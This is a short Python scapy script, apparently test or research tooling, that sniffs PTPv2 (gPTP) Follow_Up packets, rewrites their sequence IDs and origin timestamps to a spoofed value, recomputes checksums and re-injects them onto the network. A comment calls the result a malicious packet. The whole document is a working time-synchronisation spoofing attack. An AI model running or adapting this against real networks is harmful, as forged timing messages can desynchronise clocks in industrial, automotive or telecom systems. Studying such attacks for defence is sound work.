from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import UDP, IP
from gptp.layers import PTPv2
from gptp.fields import TimestampField
import time

# test
def packet_callback(packet):
    used_seq_ids = set()
    # if packet.haslayer('Ether'):
    #     print(packet[Ether].show())
    #     return
    count = 0
    if packet.haslayer('PTPv2'):
        ptp_packet = packet[PTPv2]
        if packet[PTPv2].is_followup and packet[PTPv2].sequenceId not in used_seq_ids and  packet[PTPv2].reserved1 != 2:
            print(f"seq id {packet[PTPv2].sequenceId}")
            used_seq_ids.add(packet[PTPv2].sequenceId)
            count += 1
            #print("original packet")
            print(packet.show())
            packet[PTPv2].reserved1 = 2
            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 10
            original_ts = packet[PTPv2].preciseOriginTimestamp

            #packet[PTPv2].preciseOriginTimestamp = original_ts + count
            #packet[PTPv2].preciseOriginTimestamp = 0
            packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 3.141)
            #time.sleep(0.9)
            for i in range(1):
                time.sleep(0.1)
                del(packet.getlayer(IP).chksum) 
                del(packet.getlayer(UDP).chksum) 
                sendp(packet)
                packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 10
            #print("send maliciouus packet")
            #print(packet[PTPv2].show())
            #exit()
       # print(packet[PTPv2].sequenceId)

sniff(prn=packet_callback, count=10000)

